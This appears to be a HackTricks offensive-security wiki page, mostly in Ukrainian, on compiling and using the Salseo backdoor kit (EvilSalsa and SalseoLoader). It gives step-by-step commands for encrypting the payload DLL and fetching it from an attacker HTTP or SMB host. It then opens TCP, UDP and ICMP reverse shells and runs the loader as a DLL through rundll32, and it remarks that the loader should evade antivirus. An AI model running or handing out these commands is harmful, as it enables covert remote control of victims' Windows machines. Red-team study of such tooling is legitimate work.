# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compiling the binaries

Завантажте вихідний код з github і скомпілюйте **EvilSalsa** та **SalseoLoader**. Вам потрібно буде встановити **Visual Studio** для компіляції коду.

Скомпіліруйте ці проекти для архітектури віконного комп'ютера, на якому ви будете їх використовувати (якщо Windows підтримує x64, скомпіліруйте їх для цієї архітектури).

Ви можете **вибрати архітектуру** в Visual Studio у **лівій вкладці "Build"** у **"Platform Target".**

(\*\*Якщо ви не можете знайти ці опції, натисніть на **"Project Tab"** і потім на **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (839).png>)

Потім збудуйте обидва проекти (Build -> Build Solution) (У логах з'явиться шлях до виконуваного файлу):

![](<../.gitbook/assets/image (381).png>)

## Prepare the Backdoor

По-перше, вам потрібно буде закодувати **EvilSalsa.dll.** Для цього ви можете використовувати python-скрипт **encrypterassembly.py** або скомпілювати проект **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Добре, тепер у вас є все необхідне для виконання всіх Salseo речей: **закодований EvilDalsa.dll** та **бінарний файл SalseoLoader.**

**Завантажте бінарний файл SalseoLoader.exe на машину. Вони не повинні бути виявлені жодним AV...**

## **Виконання бекдору**

### **Отримання TCP зворотного шеллу (завантаження закодованого dll через HTTP)**

Не забудьте запустити nc як слухача зворотного шеллу та HTTP сервер для обслуговування закодованого evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Отримання UDP зворотного шеллу (завантаження закодованого dll через SMB)**

Не забудьте запустити nc як прослуховувач зворотного шеллу та SMB сервер для надання закодованого evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Отримання ICMP зворотного шеллу (закодована dll вже всередині жертви)**

**Цього разу вам потрібен спеціальний інструмент на клієнті для отримання зворотного шеллу. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Вимкнути ICMP відповіді:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Виконати клієнта:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Всередині жертви, давайте виконаємо salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Компіляція SalseoLoader як DLL, що експортує основну функцію

Відкрийте проект SalseoLoader за допомогою Visual Studio.

### Додайте перед основною функцією: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Встановіть DllExport для цього проекту

#### **Інструменти** --> **Менеджер пакетів NuGet** --> **Керувати пакетами NuGet для рішення...**

![](<../.gitbook/assets/image (881).png>)

#### **Шукайте пакет DllExport (використовуючи вкладку Перегляд) і натисніть Встановити (і прийміть спливаюче вікно)**

![](<../.gitbook/assets/image (100).png>)

У вашій папці проекту з'явилися файли: **DllExport.bat** та **DllExport\_Configure.bat**

### **В**идалити DllExport

Натисніть **Видалити** (так, це дивно, але повірте, це необхідно)

![](<../.gitbook/assets/image (97).png>)

### **Вийдіть з Visual Studio та виконайте DllExport\_configure**

Просто **вийдіть** з Visual Studio

Потім перейдіть до вашої **папки SalseoLoader** і **виконайте DllExport\_Configure.bat**

Виберіть **x64** (якщо ви плануєте використовувати його всередині x64 системи, це був мій випадок), виберіть **System.Runtime.InteropServices** (всередині **Namespace для DllExport**) і натисніть **Застосувати**

![](<../.gitbook/assets/image (882).png>)

### **Відкрийте проект знову у Visual Studio**

**\[DllExport]** більше не повинно позначатися як помилка

![](<../.gitbook/assets/image (670).png>)

### Зберіть рішення

Виберіть **Тип виходу = Бібліотека класів** (Проект --> Властивості SalseoLoader --> Застосування --> Тип виходу = Бібліотека класів)

![](<../.gitbook/assets/image (847).png>)

Виберіть **платформу x64** (Проект --> Властивості SalseoLoader --> Збірка --> Цільова платформа = x64)

![](<../.gitbook/assets/image (285).png>)

Щоб **зібрати** рішення: Збірка --> Зібрати рішення (в консолі виходу з'явиться шлях до нової DLL)

### Тестуйте згенеровану DLL

Скопіюйте та вставте DLL туди, де ви хочете її протестувати.

Виконайте:
```
rundll32.exe SalseoLoader.dll,main
```
Якщо помилка не з'являється, ймовірно, у вас є функціональний DLL!!

## Отримати оболонку, використовуючи DLL

Не забудьте використовувати **HTTP** **сервер** і налаштувати **nc** **слухача**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
